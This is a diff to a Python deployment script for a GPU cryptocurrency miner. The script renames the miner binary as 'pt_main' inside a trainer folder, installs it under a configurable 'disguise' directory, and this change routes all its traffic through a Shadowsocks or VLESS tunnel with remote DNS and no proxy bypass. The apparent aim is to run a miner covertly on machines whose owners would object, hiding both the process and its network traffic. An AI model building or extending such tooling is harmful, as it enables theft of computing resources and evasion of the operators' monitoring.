@@ -13,14 +13,19 @@ import shlex
 import shutil
 import subprocess
 import sys
+import tempfile
 from pathlib import Path
+from urllib.parse import urlsplit
 
+from proxy.assets.share_links import import_link
 from utils import decrypt_config
 
 PROJECT_DIR = Path(__file__).resolve().parent
 DEFAULT_CONFIG = PROJECT_DIR / "config.json"
 TRAINER_DIR = PROJECT_DIR / "src" / "trainer"
 BUNDLED_BINARY_NAME = "pt_main"
+PROXY_MANAGER = PROJECT_DIR / "proxy" / "assets" / "manage_connection.py"
+DEFAULT_SOCKS = "socks5://127.0.0.1:10808"
 PROXY_ENV_KEYS = ("all_proxy", "ALL_PROXY", "http_proxy", "https_proxy",
                   "HTTP_PROXY", "HTTPS_PROXY", "no_proxy", "NO_PROXY")
 
@@ -39,7 +44,8 @@ def resolve(cfg):
     app_dir = Path.home() / cfg["disguise"]["app_dir_name"]
     return {
         "use_proxy": cfg.get("useProxy", False),
-        "socks": cfg.get("socks", ""),
+        "proxy_config": cfg.get("proxyConfig", ""),
+        "socks": cfg.get("socks", DEFAULT_SOCKS),
         "pool_url": cfg["pool"]["url"],
         "wallet": cfg["wallet"]["address"],
         "worker": cfg["wallet"]["worker"],
@@ -56,6 +62,31 @@ def resolve(cfg):
     }
 
 
+def local_proxy_port(socks):
+    """The managed client binds an unauthenticated, unprivileged local port."""
+    try:
+        parsed = urlsplit(socks)
+        port = parsed.port
+        if (socks.startswith("socks5://") and parsed.hostname == "127.0.0.1"
+                and port is not None and 1024 <= port <= 65535
+                and parsed.username is None and parsed.password is None
+                and not (parsed.path or parsed.query or parsed.fragment)
+                and not any(char.isspace() for char in socks)):
+            return port
+    except (ValueError, TypeError, AttributeError):
+        pass
+    raise ValueError("socks must be socks5://127.0.0.1:PORT (port 1024-65535)")
+
+
+def proxy_profile(link):
+    if not isinstance(link, str) or not link.strip() or any(char.isspace() for char in link.strip()):
+        raise ValueError("proxyConfig must contain one ss:// or vless:// share link when useProxy is true")
+    try:
+        return import_link(link.strip())[1]
+    except ValueError as exc:
+        raise ValueError(f"Invalid proxyConfig: {exc}") from exc
+
+
 def validate(c):
     if type(c["use_proxy"]) is not bool:
         raise ValueError("useProxy must be a JSON boolean (true or false)")
@@ -67,8 +98,11 @@ def validate(c):
         raise ValueError(f"Set nonempty config values for: {', '.join(missing)}")
     if any(c[key].startswith("YOUR_") for key in ("wallet", "pool_url", "algo")):
         raise ValueError("Set miner.algo, pool.url, and wallet.address before deploying.")
-    if c["use_proxy"] and not c["socks"].startswith("socks5://"):
-        raise ValueError("socks must look like socks5://[user:pass@]host:port")
+    if c["use_proxy"]:
+        local_proxy_port(c["socks"])
+        proxy_profile(c["proxy_config"])
+        if not PROXY_MANAGER.is_file():
+            raise ValueError(f"Bundled proxy manager missing: {PROXY_MANAGER}")
     if Path(c["bin_name"]).name != c["bin_name"] or c["bin_name"] in (".", ".."):
         raise ValueError("binary_name must be a filename, without directory components")
     if not (c["source_dir"] / BUNDLED_BINARY_NAME).is_file():
@@ -86,13 +120,32 @@ def tunnel_env(socks=None):
     env = {key: value for key, value in os.environ.items() if key not in PROXY_ENV_KEYS}
     if socks is None:
         return env
+    port = local_proxy_port(socks)
+    remote_dns_socks = f"socks5h://127.0.0.1:{port}"
+    http = f"http://127.0.0.1:{port}"
     return {
         **env,
-        "all_proxy": socks, "ALL_PROXY": socks,
-        "http_proxy": socks, "https_proxy": socks,
-        "HTTP_PROXY": socks, "HTTPS_PROXY": socks,
-        "no_proxy": "localhost,127.0.0.1", "NO_PROXY": "localhost,127.0.0.1",
+        "all_proxy": remote_dns_socks, "ALL_PROXY": remote_dns_socks,
+        "http_proxy": http, "https_proxy": http,
+        "HTTP_PROXY": http, "HTTPS_PROXY": http,
+        "no_proxy": "", "NO_PROXY": "",
     }
+
+
+def prepare_proxy(c):
+    """Validate, test, and activate this share link before installing the miner."""
+    if not c["use_proxy"]:
+        return
+    profile = proxy_profile(c["proxy_config"])
+    port = local_proxy_port(c["socks"])
+    # Keep credentials out of process arguments and remove the input on failure
+    # as well as success. The proxy manager keeps its own private runtime state.
+    with tempfile.NamedTemporaryFile(mode="w", encoding="utf-8",
+                                     prefix="miner-proxy-", suffix=".json") as stream:
+        json.dump(profile, stream, ensure_ascii=False)
+        stream.flush()
+        sh(sys.executable, str(PROXY_MANAGER), "setup", "--links", stream.name,
+           "--port", str(port), env=tunnel_env())
 
 
 def install(c):
@@ -135,9 +188,10 @@ def write_runner(c):
         "proxy_args=()",
         'if [[ "$USE_PROXY" == true ]]; then',
         '    proxy_args=(--proxy "$SOCKS")',
-        '    export all_proxy="$SOCKS" ALL_PROXY="$SOCKS"',
-        '    export http_proxy="$SOCKS" https_proxy="$SOCKS" HTTP_PROXY="$SOCKS" HTTPS_PROXY="$SOCKS"',
-        '    export no_proxy="localhost,127.0.0.1" NO_PROXY="localhost,127.0.0.1"',
+        '    export all_proxy="socks5h://${SOCKS#socks5://}" ALL_PROXY="socks5h://${SOCKS#socks5://}"',
+        '    export http_proxy="http://${SOCKS#socks5://}" https_proxy="http://${SOCKS#socks5://}"',
+        '    export HTTP_PROXY="$http_proxy" HTTPS_PROXY="$https_proxy"',
+        '    export no_proxy="" NO_PROXY=""',
         'fi',
         "power_args=()",
         'if [[ "$POWER_LIMIT" != 0 ]]; then power_args=(--gpu-powerlimit "$POWER_LIMIT"); fi',
@@ -176,6 +230,7 @@ def main():
             return
         if shutil.which("tmux") is None:
             raise ValueError("tmux not found; install it before launching.")
+        prepare_proxy(c)
         install(c)
         write_env_file(c)
         write_runner(c)
